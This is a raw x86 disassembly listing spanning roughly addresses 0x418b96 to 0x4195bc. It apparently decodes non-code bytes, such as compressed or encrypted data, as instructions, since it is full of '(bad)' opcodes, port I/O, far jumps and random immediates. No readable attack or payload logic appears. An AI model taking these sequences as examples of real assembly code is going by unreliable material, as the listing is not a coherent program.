  418b96:	xor    DWORD PTR [ebx-0x79],edi
  418b99:	jns    0x418bdb
  418b9b:	repz lock xchg edx,eax
  418b9e:	push   eax
  418b9f:	push   0x76
  418ba1:	sub    al,0x1d
  418ba3:	pop    edi
  418ba4:	and    al,0x1a
  418ba6:	ficomp DWORD PTR [ebp-0x21650590]
  418bac:	pop    es
  418bad:	mov    ah,BYTE PTR ss:[ebx+0x3ecce626]
  418bb4:	cmp    DWORD PTR [ebp+edi*2+0x45],ecx
  418bb8:	sub    DWORD PTR [ebx],0xffffffdf
  418bbb:	inc    edi
  418bbc:	push   es
  418bbd:	jae    0x418c1d
  418bbf:	dec    esi
  418bc0:	fcom   QWORD PTR [eax]
  418bc2:	or     eax,DWORD PTR [ecx+0x2c]
  418bc5:	pop    edx
  418bc6:	rcr    DWORD PTR [esi],cl
  418bc8:	sbb    esp,ebx
  418bca:	pop    ebx
  418bcb:	cmp    DWORD PTR [eax+eax*8-0x2c],0xb
  418bd0:	add    BYTE PTR [eax],ch
  418bd2:	psubusw mm4,mm6
  418bd5:	mov    ebp,0x904df2b2
  418bda:	xchg   ecx,eax
  418bdb:	dec    edi
  418bdc:	jb     0x418c42
  418bde:	xchg   ebp,eax
  418bdf:	call   0xbf86d150
  418be4:	iret   
  418be5:	ds pop esi
  418be7:	loope  0x418bcb
  418be9:	sub    ecx,ebx
  418beb:	sub    ebx,ebp
  418bed:	mov    ds:0xee846991,eax
  418bf2:	test   bl,0x7a
  418bf5:	lock xor eax,0x705f4db9
  418bfb:	mov    eax,ds:0x66b0a9aa
  418c00:	jmp    0x8c3760e1
  418c05:	jb     0x418c2a
  418c07:	cdq    
  418c08:	stos   BYTE PTR es:[edi],al
  418c09:	lods   al,BYTE PTR ds:[esi]
  418c0a:	fstp   QWORD PTR [ebx-0x35]
  418c0d:	add    BYTE PTR [ebx+0x4bfa0dd6],bh
  418c13:	out    0xce,eax
  418c15:	jmp    0x418bd3
  418c17:	out    0x5,al
  418c19:	(bad)  
  418c1a:	stc    
  418c1b:	adc    eax,0xd74c47d3
  418c20:	jmp    0x9407:0xc0493623
  418c27:	mov    al,0x66
  418c29:	ins    DWORD PTR es:[edi],dx
  418c2a:	pop    ebp
  418c2b:	push   edx
  418c2c:	neg    ah
  418c2e:	pop    eax
  418c2f:	inc    eax
  418c30:	ror    BYTE PTR [esi-0x12],0xa
  418c34:	ja     0x418c36
	...
  418c96:	sti    
  418c97:	inc    edx
  418c98:	out    dx,al
  418c99:	aas    
  418c9a:	(bad)  
  418c9b:	mov    edi,0x9c1c6fb
  418ca0:	scas   al,BYTE PTR es:[edi]
  418ca1:	adc    ebp,DWORD PTR [edx]
  418ca3:	outs   dx,DWORD PTR ds:[esi]
  418ca4:	jo     0x418d12
  418ca6:	pop    ecx
  418ca7:	add    al,0x1
  418ca9:	add    BYTE PTR [edi],al
  418cab:	add    DWORD PTR [eax],eax
  418cad:	add    BYTE PTR [ebp-0x750ecd54],dh
  418cb3:	push   ebp
  418cb4:	sbb    DWORD PTR [edx*2-0x3b92345],0x4
  418cbc:	or     ecx,DWORD PTR [edx-0x3ee263c8]
  418cc2:	push   0x80409ab3
  418cc7:	dec    esi
  418cc8:	test   DWORD PTR [edx],eax
  418cca:	cwde   
  418ccb:	outs   dx,DWORD PTR ds:[esi]
  418ccc:	push   ecx
  418ccd:	push   0x25ea885f
  418cd2:	aas    
  418cd3:	xchg   esp,eax
  418cd4:	int    0xa0
  418cd6:	and    DWORD PTR [eax+edi*2+0x34],ebp
  418cda:	xchg   edx,eax
  418cdb:	(bad)  
  418cdc:	fisttp QWORD PTR [ebx+edx*2-0x16]
  418ce0:	mov    ch,cl
  418ce2:	ins    DWORD PTR es:[edi],dx
  418ce3:	outs   dx,DWORD PTR ds:[esi]
  418ce4:	retf   0xdc2b
  418ce7:	shl    DWORD PTR [ecx+ebp*8+0x67],1
  418ceb:	sub    al,0xff
  418ced:	mov    eax,0x1c3b9bdc
  418cf2:	mov    cs,WORD PTR [edx+0x773d72dc]
  418cf8:	or     eax,DWORD PTR [ebp+0x43]
  418cfb:	test   DWORD PTR [edx],esi
  418cfd:	cmp    eax,0xb3231807
  418d02:	pusha  
  418d03:	clc    
  418d04:	rcr    BYTE PTR [esi-0x6a],0xce
  418d08:	push   es
  418d09:	mov    dh,dl
  418d0b:	inc    ebx
  418d0c:	mov    ebx,0xbd5e442f
  418d11:	adc    eax,0x6ebcfa3
  418d16:	and    eax,eax
  418d18:	or     bh,BYTE PTR [edi+esi*1+0x25]
  418d1c:	sbb    al,0x5e
  418d1e:	jbe    0x418d87
  418d20:	mov    bl,0x6f
  418d22:	pop    es
  418d23:	pop    edx
  418d24:	lahf   
  418d25:	shl    BYTE PTR [eax-0x7e],0x2c
  418d29:	mov    ecx,0xed0269f8
  418d2e:	pop    ds
  418d2f:	ret    0xb152
  418d32:	loope  0x418d86
  418d34:	add    esp,ebx
  418d36:	arpl   WORD PTR [edx+eax*1+0x64],bx
  418d3a:	les    edx,FWORD PTR [esi+0x5]
  418d3d:	mov    esp,0xad1b954b
  418d42:	repz or eax,0x3e12ff3c
  418d48:	dec    ecx
  418d49:	mov    edx,0x7f072f05
  418d4e:	icebp  
  418d4f:	sub    dl,ah
  418d51:	ficomp WORD PTR [ecx]
  418d53:	mov    al,0xd3
  418d55:	js     0x418cfc
  418d57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d58:	add    esi,edx
  418d5a:	ds adc DWORD PTR fs:[ebp-0x77d4b53c],0xa1a0f409
  418d66:	pop    es
  418d67:	sbb    al,ch
  418d69:	outs   dx,BYTE PTR ds:[esi]
  418d6a:	test   eax,0x452590d4
  418d6f:	adc    eax,0x6fa2f952
  418d74:	repnz aas 
  418d76:	shl    DWORD PTR [edi-0x6f726503],0xb4
  418d7d:	std    
  418d7e:	sbb    eax,0xc39f1ada
  418d83:	fadd   DWORD PTR [ebp-0x6120bb60]
  418d89:	pop    es
  418d8a:	fdivr  st,st(3)
  418d8c:	dec    eax
  418d8d:	cmp    DWORD PTR [ecx],ebx
  418d8f:	aaa    
  418d90:	inc    esi
  418d91:	push   ebx
  418d92:	sbb    al,0x7f
  418d94:	pop    ss
  418d95:	jp     0x418de1
  418d97:	iret   
  418d98:	and    dl,BYTE PTR [edi-0x334c1880]
  418d9e:	mov    esi,0xc89c45f4
  418da3:	out    dx,al
  418da4:	out    0xf5,eax
  418da6:	push   0x5cdd26e7
  418dab:	cmp    bl,0xe4
  418dae:	or     bl,cl
  418db0:	push   cs
  418db1:	inc    edi
  418db2:	xchg   DWORD PTR [edx+edi*1],edi
	...
  418e15:	add    BYTE PTR [esi],cl
  418e17:	bnd call 0xde7c8a4d
  418e1d:	(bad)  
  418e1e:	jl     0x418e26
  418e20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e21:	mov    al,ds:0x9fcea34d
  418e26:	pusha  
  418e27:	add    eax,0x1070001
  418e2c:	add    BYTE PTR [eax],al
  418e2e:	xchg   edi,eax
  418e2f:	pop    edx
  418e30:	jge    0x418dba
  418e32:	pop    edi
  418e33:	sbb    al,0x9b
  418e35:	dec    eax
  418e36:	leave  
  418e37:	sub    esp,ecx
  418e39:	sub    ch,BYTE PTR [ebx+edx*1-0x20bae9bd]
  418e40:	cmp    al,0xd5
  418e42:	test   al,0x95
  418e44:	xchg   ecx,ecx
  418e46:	sbb    esi,ebp
  418e48:	sbb    al,0x2
  418e4a:	cmp    BYTE PTR [eax+edi*2],al
  418e4d:	inc    ebp
  418e4e:	retf   
  418e4f:	fstp   QWORD PTR [edx+edi*8+0x6f]
  418e53:	push   esi
  418e54:	in     al,0x35
  418e56:	sahf   
  418e57:	pop    esi
  418e58:	aad    0x4e
  418e5a:	dec    edi
  418e5b:	push   edx
  418e5c:	dec    ecx
  418e5d:	xchg   ecx,eax
  418e5e:	dec    ebx
  418e5f:	(bad)  
  418e60:	sub    dl,BYTE PTR [ecx]
  418e62:	sti    
  418e63:	fnstcw WORD PTR ds:[ebp+eiz*4-0x36]
  418e68:	out    0x95,eax
  418e6a:	pop    ebp
  418e6b:	jmp    0x354e70e7
  418e70:	or     al,0x75
  418e72:	sub    BYTE PTR [edi+0x28f9993a],bh
  418e78:	jbe    0x418e9e
  418e7a:	jle    0x418e01
  418e7c:	scas   eax,DWORD PTR es:[edi]
  418e7d:	lods   eax,DWORD PTR ds:[esi]
  418e7e:	mov    BYTE PTR [esi],ah
  418e80:	out    0xcd,al
  418e82:	in     eax,dx
  418e83:	dec    esi
  418e84:	dec    ebp
  418e85:	adc    DWORD PTR [eax+0x3fc88b04],edx
  418e8b:	aam    0x95
  418e8d:	pop    ecx
  418e8e:	repnz inc edi
  418e90:	inc    ebx
  418e91:	ss data16 lahf 
  418e94:	cmp    eax,0x8814577
  418e99:	gs jnp 0x418e21
  418e9c:	jno    0x418e7a
  418e9e:	inc    ecx
  418e9f:	sub    esp,ebx
  418ea1:	daa    
  418ea2:	fmul   QWORD PTR [ecx-0x6c]
  418ea5:	rcl    DWORD PTR [eax+0x6f71b0c],1
  418eab:	and    BYTE PTR [ebx+0x6b],0x21
  418eaf:	push   ebx
  418eb0:	jge    0x418e7b
  418eb2:	std    
  418eb3:	in     al,0x43
  418eb5:	jns    0x418f31
  418eb7:	mov    edi,0x6776df52
  418ebc:	adc    dh,bh
  418ebe:	test   DWORD PTR [ebx-0x4],0xd841c2e3
  418ec5:	je     0x418f38
  418ec7:	imul   esi,DWORD PTR [edx],0x6626d402
  418ecd:	xor    ebx,ebx
  418ecf:	add    dl,BYTE PTR [ecx]
  418ed1:	cmp    BYTE PTR [eax-0x6f8c5c6c],ch
  418ed7:	jne    0x418eb1
  418ed9:	ss das 
  418edb:	push   eax
  418edc:	inc    ebx
  418edd:	dec    BYTE PTR [ebp+0xc8ccac0]
  418ee3:	inc    eax
  418ee4:	jmp    0x486:0x6956483e
  418eeb:	and    DWORD PTR [ecx-0x2e],esp
  418eee:	scas   eax,DWORD PTR es:[edi]
  418eef:	dec    edx
  418ef0:	pop    es
  418ef1:	pop    edx
  418ef2:	push   es
  418ef3:	adc    al,0x36
  418ef5:	pop    ebx
  418ef6:	js     0x418e98
  418ef8:	dec    eax
  418ef9:	inc    esi
  418efa:	pop    edi
  418efb:	xor    dh,BYTE PTR [edi+0x7f]
  418efe:	stos   DWORD PTR es:[edi],eax
  418eff:	imul   esp,DWORD PTR [edx-0x4c],0xaa3ceb98
  418f06:	or     eax,esp
  418f08:	jne    0x418ea0
  418f0a:	xor    BYTE PTR [edi+ebp*2-0x3395af88],0xff
  418f12:	or     eax,0xd96f095f
  418f17:	mov    bh,0x65
  418f19:	pop    ss
  418f1a:	sub    BYTE PTR [edx-0x6a85b776],dl
  418f20:	add    BYTE PTR [eax],al
  418f22:	lahf   
  418f23:	dec    esp
  418f24:	add    al,0xd3
  418f26:	add    BYTE PTR [ebx+esi*1],dh
  418f29:	sub    DWORD PTR [eax+0x5b],0xbd1a2a9b
  418f30:	(bad)  
  418f32:	fisubr DWORD PTR [edx]
  418f34:	ret    0x0
	...
  418f93:	add    BYTE PTR [eax],al
  418f95:	add    BYTE PTR [edi+edx*4],bl
  418f98:	in     al,0x47
  418f9a:	out    dx,eax
  418f9b:	ja     0x418f5c
  418f9d:	fist   WORD PTR [ebp-0x6e85234e]
  418fa3:	and    ch,bl
  418fa5:	loopne 0x41900e
  418fa7:	push   es
  418fa8:	add    DWORD PTR [eax],eax
  418faa:	pop    es
  418fab:	add    DWORD PTR [eax],eax
  418fad:	add    cl,al
  418faf:	cwde   
  418fb0:	jl     0x418f8c
  418fb2:	mov    ds:0x5a94ee87,al
  418fb7:	mov    bh,0x27
  418fb9:	and    BYTE PTR [ecx+ebx*2+0x2e08e459],0x75
  418fc1:	sub    al,0x63
  418fc3:	cmp    DWORD PTR [edx*8+0x3d06fd94],ebp
  418fca:	mov    eax,0x1784356d
  418fcf:	mov    eax,ds:0x4db29a19
  418fd4:	lods   eax,DWORD PTR ds:[esi]
  418fd5:	adc    eax,0x9bd1555e
  418fda:	fwait
  418fdb:	sahf   
  418fdc:	dec    edi
  418fdd:	and    DWORD PTR [edx-0xe],0xffffffd3
  418fe1:	and    cl,BYTE PTR [edi-0x740b69c6]
  418fe7:	adc    BYTE PTR [ecx+0x9],0xab
  418feb:	in     eax,dx
  418fec:	add    DWORD PTR [eax+0x11254d8f],0x13
  418ff3:	mov    BYTE PTR [esi+0x78],bh
  418ff6:	mov    fs,WORD PTR [ebx]
  418ff8:	rcr    DWORD PTR [ecx],0xa
  418ffb:	retf   
  418ffc:	mov    al,0x95
  418ffe:	jnp    0x41903b
  419000:	add    dl,BYTE PTR [ecx-0x25a5d91f]
  419006:	(bad)  
  419007:	fidivr WORD PTR [ebx+edx*8+0x38]
  41900b:	xchg   edx,eax
  41900c:	outs   dx,DWORD PTR ds:[esi]
  41900d:	daa    
  41900e:	cmp    BYTE PTR [eax+0x55f71f8],ch
  419014:	jle    0x419028
  419016:	adc    eax,0xa540ee36
  41901b:	cmp    ebp,esp
  41901d:	shr    DWORD PTR [edi],0x1e
  419020:	jmp    0x3876:0x839a6e8
  419027:	cdq    
  419028:	sti    
  419029:	add    DWORD PTR [edx-0x7354361f],0x47
  419030:	sbb    esp,0x4e
  419033:	cmp    DWORD PTR [esi],edi
  419035:	jb     0x418fb9
  419037:	jle    0x41901f
  419039:	inc    ecx
  41903a:	(bad)  
  41903b:	mov    bl,0x97
  41903d:	(bad)  
  41903e:	int3   
  41903f:	push   0xd30896d7
  419044:	aaa    
  419045:	mov    eax,0x2dc50b48
  41904a:	scas   al,BYTE PTR es:[edi]
  41904b:	jbe    0x41908f
  41904d:	push   ds
  41904e:	jne    0x4190cb
  419050:	sahf   
  419051:	cmp    BYTE PTR [edx-0x56ce787],cl
  419057:	(bad)  
  419058:	mov    ebp,0xa261ac81
  41905d:	mov    al,0xbd
  41905f:	aas    
  419060:	inc    esp
  419061:	sahf   
  419062:	cmc    
  419063:	dec    edx
  419064:	mov    bl,0x94
  419066:	and    ebx,edx
  419068:	(bad)
  41906d:	jp     0x4190b2
  41906f:	aaa    
  419070:	xchg   edx,eax
  419071:	out    0xad,eax
  419073:	pop    esi
  419074:	push   edx
  419075:	push   ebp
  419076:	shr    BYTE PTR [ecx+0x24],cl
  419079:	in     eax,dx
  41907a:	pop    esp
  41907b:	ret    0x39f4
  41907e:	xchg   ecx,eax
  41907f:	push   ds
  419080:	adc    al,0xb2
  419082:	scas   al,BYTE PTR es:[edi]
  419083:	rol    BYTE PTR [ecx-0x37],cl
  419086:	xchg   BYTE PTR [ebx+edi*2-0x2952ec1a],ah
  41908d:	sti    
  41908e:	pop    edi
  41908f:	push   ss
  419090:	jb     0x4190c8
  419092:	mov    eax,ds:0x788e01c
  419097:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419098:	test   DWORD PTR [edx],0x7e109910
  41909e:	(bad)  
  41909f:	repnz cld 
  4190a1:	jmp    0x419029
  4190a3:	adc    eax,0x79a23b41
  4190a8:	inc    ecx
  4190a9:	push   esi
  4190aa:	dec    edx
  4190ab:	pop    ds
  4190ac:	loopne 0x41903c
  4190ae:	push   cs
  4190af:	inc    edx
  4190b0:	fidivr DWORD PTR [edx]
  4190b2:	fstp   DWORD PTR [esi+0x35]
	...
  419114:	add    BYTE PTR [eax],al
  419116:	scas   eax,DWORD PTR es:[edi]
  419117:	test   DWORD PTR [esi-0xa441be],ebx
  41911d:	in     eax,dx
  41911e:	daa    
  41911f:	jle    0x4190b5
  419121:	add    ebx,DWORD PTR [edi+0x6ed6bbc3]
  419127:	pop    es
  419128:	add    DWORD PTR [eax],eax
  41912a:	pop    es
  41912b:	add    DWORD PTR [eax],eax
  41912d:	add    cl,ah
  41912f:	dec    bh
  419131:	scas   al,BYTE PTR es:[edi]
  419132:	mov    cl,0x93
  419134:	icebp  
  419135:	lock icebp 
  419137:	(bad)  
  419139:	mov    dl,0x3f
  41913b:	cmc    
  41913c:	mov    cl,0xfc
  41913e:	adc    edi,ebp
  419140:	sbb    ebx,DWORD PTR [eax-0x47]
  419143:	xchg   esp,eax
  419144:	cld    
  419145:	outs   dx,DWORD PTR ds:[esi]
  419146:	outs   dx,DWORD PTR ds:[esi]
  419147:	add    bh,BYTE PTR [edi+0x77]
  41914a:	out    0x64,al
  41914c:	stos   DWORD PTR es:[edi],eax
  41914d:	push   ebx
  41914e:	push   esp
  41914f:	aas    
  419150:	das    
  419151:	adc    DWORD PTR [eax-0x80],eax
  419154:	int    0x27
  419156:	cmp    DWORD PTR [esi-0x39],edi
  419159:	popf   
  41915a:	outs   dx,BYTE PTR cs:[esi]
  41915c:	scas   eax,DWORD PTR es:[edi]
  41915d:	arpl   WORD PTR [ecx-0x46],cx
  419160:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419161:	xor    eax,DWORD PTR [ecx+0x4a]
  419164:	lods   al,BYTE PTR ds:[esi]
  419165:	movaps xmm6,xmm2
  419168:	out    0xcf,al
  41916a:	clc    
  41916b:	imul   DWORD PTR gs:0x2473f726
  419172:	out    0x95,al
  419174:	out    0x8a,al
  419176:	sub    DWORD PTR [eax+0x566f6abc],0x53
  41917d:	mov    esi,0x88118a1f
  419182:	outs   dx,BYTE PTR ds:[esi]
  419183:	lods   al,BYTE PTR ds:[esi]
  419184:	aas    
  419185:	mov    ch,0xc5
  419187:	mov    esi,0x7f2f83ed
  41918c:	in     eax,dx
  41918d:	loopne 0x4191c7
  41918f:	je     0x41915e
  419191:	xchg   esi,eax
  419192:	mov    ebx,DWORD PTR [esi]
  419194:	clc    
  419195:	ret    
  419196:	loop   0x419141
  419198:	out    dx,eax
  419199:	jl     0x419219
  41919b:	neg    bh
  41919d:	test   al,0x21
  41919f:	add    dl,BYTE PTR [esp+ecx*1]
  4191a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4191a3:	mov    BYTE PTR [ebx-0x1b1bf788],dh
  4191a9:	adc    al,0xdd
  4191ab:	inc    eax
  4191ac:	jecxz  0x41914a
  4191ae:	push   esi
  4191af:	xlat   BYTE PTR ds:[ebx]
  4191b0:	xchg   edx,eax
  4191b1:	adc    DWORD PTR [edi+0x6c],ebp
  4191b4:	les    edi,FWORD PTR [eax*1+0x5dff74d5]
  4191bb:	adc    al,0xf0
  4191bd:	mov    ecx,0xeabd41f7
  4191c2:	xchg   esp,eax
  4191c3:	and    al,0xea
  4191c5:	sti    
  4191c6:	push   0xffffff88
  4191c8:	push   es
  4191c9:	fs jecxz 0x419196
  4191cc:	cmp    al,0x7
  4191ce:	sbb    al,0xe9
  4191d0:	les    edi,FWORD PTR [eax-0x37]
  4191d3:	xor    al,0x99
  4191d5:	mov    al,0x42
  4191d7:	mov    ds:0x427eb89d,al
  4191dc:	push   edx
  4191dd:	fsub   DWORD PTR [ecx+edi*2+0x47b1c966]
  4191e4:	push   0xe950cf21
  4191e9:	push   es
  4191ea:	lods   eax,DWORD PTR ds:[esi]
  4191eb:	enter  0xe9ef,0x2c
  4191ef:	repz fwait
  4191f1:	sub    al,0x5d
  4191f3:	adc    cl,BYTE PTR [eax-0xb706500]
  4191f9:	mov    eax,ds:0x7e10ed48
  4191fe:	jns    0x419183
  419200:	mov    DWORD PTR [ebx-0x3ae5b748],ebx
  419206:	mov    cl,0x41
  419208:	jnp    0x419264
  41920a:	cmp    edx,DWORD PTR [edx]
  41920c:	or     edi,DWORD PTR [edx-0x459d5b86]
  419212:	jp     0x419281
  419214:	inc    esp
  419215:	rcl    BYTE PTR [esi],0x48
  419218:	lds    edx,FWORD PTR [edi-0x5e21c2f4]
  41921e:	and    BYTE PTR [edi-0x79],cl
  419221:	outs   dx,BYTE PTR ds:[esi]
  419222:	mov    dl,0x94
  419224:	and    DWORD PTR [ebp-0x24431827],ebp
  41922a:	fstp   DWORD PTR [eax-0x4830be22]
  419230:	loop   0x419209
  419232:	out    dx,eax
  419233:	sar    edi,1
	...
  419295:	add    BYTE PTR [eax-0xcc4519],ah
  41929b:	jg     0x419246
  41929d:	idiv   DWORD PTR [edi+ebx*2]
  4192a0:	mov    esp,0x3067854f
  4192a5:	adc    esi,DWORD PTR [ebp+0x8]
  4192a8:	add    DWORD PTR [eax],eax
  4192aa:	pop    es
  4192ab:	add    DWORD PTR [eax],eax
  4192ad:	add    BYTE PTR [edi],al
  4192af:	ret    0x2328
  4192b2:	adc    edi,DWORD PTR [edx-0x2a]
  4192b5:	mov    bl,0x72
  4192b7:	imul   edx,DWORD PTR [edx-0x7d],0x72
  4192bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4192bc:	inc    edi
  4192bd:	test   al,0xee
  4192bf:	pop    eax
  4192c0:	inc    ebx
  4192c1:	scas   al,BYTE PTR es:[edi]
  4192c2:	inc    ecx
  4192c3:	dec    eax
  4192c4:	cwde   
  4192c5:	adc    BYTE PTR [eax+0x32913cf7],dh
  4192cb:	pop    edx
  4192cc:	pop    ds
  4192cd:	dec    esi
  4192ce:	xchg   BYTE PTR [ecx],al
  4192d0:	and    cl,0xba
  4192d3:	fst    st(6)
  4192d5:	xor    ebx,DWORD PTR [edi-0x72]
  4192d8:	int    0xc7
  4192da:	mov    ecx,0xf49a68c7
  4192df:	pop    ds
  4192e0:	lods   al,BYTE PTR ds:[esi]
  4192e1:	das    
  4192e2:	jns    0x4192f8
  4192e4:	mov    esi,0x56f06c49
  4192e9:	dec    ebx
  4192ea:	xchg   edi,eax
  4192eb:	mov    esi,DWORD PTR [eax+eax*4+0x771ec0a9]
  4192f2:	cmp    al,0x33
  4192f4:	push   edx
  4192f5:	mov    bh,0x25
  4192f7:	in     eax,dx
  4192f8:	jae    0x419314
  4192fa:	dec    DWORD PTR [ecx+0x56]
  4192fd:	mov    cl,0x9f
  4192ff:	mov    bl,0xf5
  419301:	bound  edx,QWORD PTR [esi+0x5d3ed8f8]
  419307:	fcomp  DWORD PTR [ebp-0x453af7db]
  41930d:	pop    esp
  41930e:	std    
  41930f:	or     BYTE PTR [edi+ecx*2+0x67],cl
  419313:	cmp    al,0x38
  419315:	mov    eax,ds:0x8ee5eea1
  41931a:	jo     0x41936b
  41931c:	retf   
  41931d:	jp     0x4192a3
  41931f:	in     al,0x3
  419321:	mov    dh,0x48
  419323:	aam    0x45
  419325:	dec    edx
  419326:	push   cs
  419327:	mov    eax,0xca9a7d31
  41932c:	mov    cl,0x5e
  41932e:	pop    ds
  41932f:	ds jp  0x4192e1
  419332:	dec    eax
  419333:	mov    al,dl
  419335:	xchg   bh,dh
  419337:	or     DWORD PTR [eax-0x3c1cd091],esp
  41933d:	rcl    ecx,1
  41933f:	push   edx
  419340:	pop    ss
  419341:	mov    ?,ebx
  419343:	mov    WORD PTR ds:0xb07a65fc,fs
  419349:	xchg   esp,eax
  41934a:	js     0x4193b6
  41934c:	sub    edi,DWORD PTR [edi+edi*2-0xd0ed1c2]
  419353:	pop    esp
  419354:	and    BYTE PTR [esi+0x56ef501d],cl
  41935a:	mov    bl,0x25
  41935c:	inc    esi
  41935d:	mov    cl,0x57
  41935f:	in     eax,dx
  419360:	mov    eax,ds:0x4067c968
  419365:	sti    
  419366:	pop    ds
  419367:	leave  
  419368:	fild   QWORD PTR [edi+ebp*1+0x7d]
  41936c:	xlat   BYTE PTR ds:[ebx]
  41936d:	sub    eax,0xd1367ee5
  419372:	xchg   esi,eax
  419373:	push   esi
  419374:	xchg   DWORD PTR [edi],esp
  419376:	lods   eax,DWORD PTR ds:[esi]
  419377:	scas   al,BYTE PTR es:[edi]
  419378:	push   ss
  419379:	loop   0x419310
  41937b:	fst    DWORD PTR ds:0xa960bc36
  419381:	leave  
  419382:	popa   
  419383:	stc    
  419384:	jmp    0x64532977
  419389:	mov    edx,0xa5365c1a
  41938e:	adc    BYTE PTR [ebp-0xa],ch
  419391:	jne    0x419394
  419393:	push   0x1a
  419395:	xchg   ebp,esi
  419397:	test   ebp,edx
  419399:	pop    edx
  41939a:	cs jno 0x4193e0
  41939d:	mov    al,0xef
  41939f:	lods   al,BYTE PTR ds:[esi]
  4193a0:	div    dl
  4193a2:	adc    eax,0xf9aabae9
  4193a7:	cli    
  4193a8:	iret   
  4193a9:	pop    ebx
  4193aa:	test   DWORD PTR [ebx],esi
  4193ac:	jne    0x4193db
  4193ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4193af:	lock xor bl,dh
  4193b2:	push   es
  4193b3:	pop    edi
  4193b4:	sbb    al,0x0
	...
  419416:	cmp    eax,0xed3a6998
  41941b:	sti    
  41941c:	jg     0x4193bd
  41941e:	les    ecx,FWORD PTR [ebp+ebp*8-0x49106c9]
  419425:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419426:	jl     0x419431
  419428:	add    DWORD PTR [eax],eax
  41942a:	pop    es
  41942b:	add    DWORD PTR [eax],eax
  41942d:	add    BYTE PTR [eax-0x5a],bh
  419430:	call   DWORD PTR [ebp-0x49098f5f]
  419436:	mov    eax,0xb146c743
  41943b:	xchg   ecx,eax
  41943c:	jl     0x419481
  41943e:	inc    edx
  41943f:	mov    BYTE PTR [edx-0x4d9ece42],ah
  419445:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419446:	mov    bl,BYTE PTR ds:0x3f84d88
  41944c:	xchg   bl,dh
  41944e:	shl    DWORD PTR [edx],0xce
  419451:	or     ah,BYTE PTR [ebp+0x3]
  419454:	mov    bl,BYTE PTR [ecx+0x57]
  419457:	mov    edi,0xb55dcb69
  41945c:	test   al,0x88
  41945e:	jns    0x4194d8
  419460:	shl    DWORD PTR [ebp-0xf3b2803],1
  419466:	clc    
  419467:	dec    eax
  419468:	shl    bl,0x73
  41946b:	push   esp
  41946c:	push   eax
  41946d:	or     edi,eax
  41946f:	dec    esp
  419470:	and    al,0xc5
  419472:	or     DWORD PTR [edi+0x9],ebx
  419475:	adc    al,0xb1
  419477:	div    BYTE PTR [eax]
  419479:	cmp    al,0xfa
  41947b:	cmp    ch,BYTE PTR [edi+0x36]
  41947e:	mov    esp,0x67702577
  419483:	leave  
  419484:	lods   eax,DWORD PTR ds:[esi]
  419485:	(bad)  
  419486:	(bad)  
  419487:	sub    al,0xd6
  419489:	aas    
  41948a:	in     al,dx
  41948b:	or     al,BYTE PTR [eax]
  41948d:	outs   dx,DWORD PTR ds:[esi]
  41948e:	repnz adc DWORD PTR ds:0xb1e5a0c4,0x6
  419496:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419497:	push   edi
  419498:	mov    ah,0x6e
  41949a:	cdq    
  41949b:	cwde   
  41949c:	nop
  41949d:	sub    al,0xa7
  41949f:	int3   
  4194a0:	add    al,0x92
  4194a2:	(bad)  
  4194a3:	std    
  4194a4:	int    0x4e
  4194a6:	mov    edx,0x3d5b3e0e
  4194ab:	or     eax,0x759cdc7a
  4194b0:	add    al,0xcf
  4194b2:	dec    edi
  4194b3:	cmp    eax,0x597cec6
  4194b8:	mov    bl,0x6c
  4194ba:	lods   al,BYTE PTR ds:[esi]
  4194bb:	test   BYTE PTR [ebp+0x3f937dd9],0x74
  4194c2:	xchg   ebx,eax
  4194c3:	aas    
  4194c4:	inc    esi
  4194c5:	xchg   BYTE PTR [edx],bl
  4194c7:	dec    esi
  4194c8:	cli    
  4194c9:	ins    DWORD PTR es:[edi],dx
  4194ca:	rcr    BYTE PTR ds:0x806ca6cf,1
  4194d0:	ret    0x72e6
  4194d3:	ss cwde 
  4194d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4194d6:	jne    0x41945e
  4194d8:	push   esi
  4194d9:	loopne 0x419542
  4194db:	mov    eax,ds:0x8dc12602
  4194e0:	mov    bh,0x13
  4194e2:	out    0xc8,eax
  4194e4:	aam    0xea
  4194e6:	sbb    eax,0x6331893
  4194eb:	cld    
  4194ec:	aam    0xa
  4194ee:	adc    BYTE PTR [esi],ah
  4194f0:	adc    esp,0xffffffb4
  4194f3:	call   0xddc9:0xfc38865f
  4194fa:	adc    eax,DWORD PTR [eax+edx*2-0x3d89077e]
  419501:	dec    edi
  419502:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419503:	imul   DWORD PTR [eax]
  419505:	out    0x20,eax
  419507:	fcmovb st,st(4)
  419509:	dec    ebp
  41950a:	mov    WORD PTR [ebp-0x7b8abcf2],fs
  419510:	(bad)  [edx+0x6b]
  419513:	push   ebx
  419514:	(bad)  
  419515:	ficomp WORD PTR [eax]
  419517:	cmp    ah,BYTE PTR [ebx]
  419519:	shl    BYTE PTR [ebx-0x76],cl
  41951c:	xchg   ebx,eax
  41951d:	push   ax
  41951f:	push   ebx
  419520:	test   DWORD PTR [edx-0x79],edi
  419523:	ss fwait
  419525:	leavew 
  419527:	adc    BYTE PTR [ebx+edx*1+0x78],ch
  41952b:	xor    eax,0x801e5d71
  419530:	xor    edi,DWORD PTR [edx]
  419532:	fcom   DWORD PTR ss:[eax+eax*1+0x0]
	...
  419593:	add    BYTE PTR [eax],al
  419595:	add    BYTE PTR [edi-0x9d722c],ch
  41959b:	jnp    0x41958c
  41959d:	fnsave [ebx-0xf]
  4195a0:	xchg   esi,eax
  4195a1:	mul    cl
  4195a3:	rcr    DWORD PTR [edx-0xd],1
  4195a6:	or     DWORD PTR [edx],0x1
  4195a9:	add    BYTE PTR [edi],al
  4195ab:	add    DWORD PTR [eax],eax
  4195ad:	add    dl,ah
  4195af:	daa    
  4195b0:	jp     0x4195c0
  4195b2:	js     0x41961b
  4195b4:	fwait
  4195b5:	add    DWORD PTR [ecx],ebp
  4195b7:	je     0x419600
  4195b9:	add    DWORD PTR [esi],edi
  4195bb:	xchg   ebx,eax
  4195bc:	in     eax,dx
